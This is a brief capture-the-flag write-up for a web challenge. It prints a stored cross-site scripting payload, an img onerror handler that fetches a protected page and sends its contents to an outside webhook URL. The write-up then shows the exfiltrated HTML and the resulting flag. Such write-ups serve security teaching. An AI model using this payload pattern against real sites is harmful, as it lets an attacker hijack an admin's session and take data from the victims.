# Exercise 7-B Greedy Firebird Chan [100 points] (21 solves)
Payload: `<img src="x" onerror='fetch("http://chal.firebird.sh:35039/exercise_flag").then(r=>r.text()).then(b=>fetch("https://webhook.site/aeb984f9-36cc-4c19-9500-247279ca72f1?msg="+ encodeURIComponent(b)))'>`
Use the payload to update the profile, and send our profile url to admin. Then, webhook should receive the message in query_strings:
```text
<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1"> <title>Firebird Chan's CTF Flag Bank</title> <script src="https://cdn.tailwindcss.com"></script> </head> <body class="flex flex-col h-screen bg-zinc-800"> <h3 class="flex flex-col items-center justify-center text-center h-screen text-white bg-zinc-800"> <p class="my-4 text-xl font-semibold">The flag is in the image below, you can access the image link directly:</p> <img src="/static/images/323a3a990d939a2b1d1e5aba97a0b6fa.jpg"> </h3> </html>
```
`/static/images/323a3a990d939a2b1d1e5aba97a0b6fa.jpg` is where our flag located.

flag: `flag{f1R3b1rd_ch4n_h04rD5_boTh_flaG5_4nd_1mAg35}`